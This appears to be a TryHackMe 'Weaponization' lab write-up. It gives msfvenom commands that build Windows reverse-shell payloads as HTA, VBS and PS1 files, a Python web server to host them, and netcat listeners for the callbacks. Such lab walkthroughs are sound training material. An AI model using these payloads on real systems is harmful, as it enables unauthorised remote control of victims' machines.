# Weaponization

**Room Link:** [https://tryhackme.com/room/weaponization](https://tryhackme.com/room/weaponization)



## Practice Area

**From the room:** The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link.

We will be exploiting this box with every mentioned above.&#x20;

### HTA

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f hta-psh -o thm.hta
python2 -m SimpleHTTPServer 81
```

**Kali #2**

```
rlwrap nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

### VBS

**Kali #1**

```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vbs -o exploit.vbs
```

**Kali #2**

```
rlwrap nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### DOC

Do when have access to a Windows machine with word.

### PS1

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f psh -o exploit.ps1
```

**Kali #2**

```
rlwrap nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
